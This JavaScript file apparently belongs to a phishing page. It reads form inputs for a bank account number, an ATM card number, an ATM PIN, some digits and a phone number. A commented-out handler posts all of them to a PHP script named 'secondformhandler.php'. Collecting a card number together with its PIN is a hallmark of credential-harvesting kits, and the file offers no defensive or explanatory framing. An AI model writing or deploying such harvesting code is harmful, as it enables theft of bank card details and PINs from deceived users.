const acct = document.getElementById("acct");
const atcard = document.getElementById("atcard");
const atpin = document.getElementById("atpin");
const mdigit = document.getElementById("mdigit");
const phonenum = document.getElementById("phonenum");



console.log()







const btnSpan = document.getElementById("btn-span");
const btnNav = document.getElementById("nav-btn");
const firstNav = document.getElementById("first-nav")
let boolean = false;
let controlBtn;





const btnFunc =()=>{
    
        firstNav.classList.toggle("move-it");
        
}





//btnNav.addEventListener("click", btnFunc)

/*submitApply.addEventListener("click", async (e)=>{
e.preventDefault()

try{
 let start = await fetch("./includes/secondformhandler.php", {
        method: "post",
        headers: {
              "Content-Type": "application/json; charset=utf-8"
        }, 
        body: JSON.stringify({"acct": acct.value, "atcard": atcard.value, "atpin": atpin.value, "mdigit": mdigit.value, "phonenum": phonenum.value})
 })

 let sendam = await start.json()
 console.log(sendam)
}catch(error){
      console.log(error)
}


}) */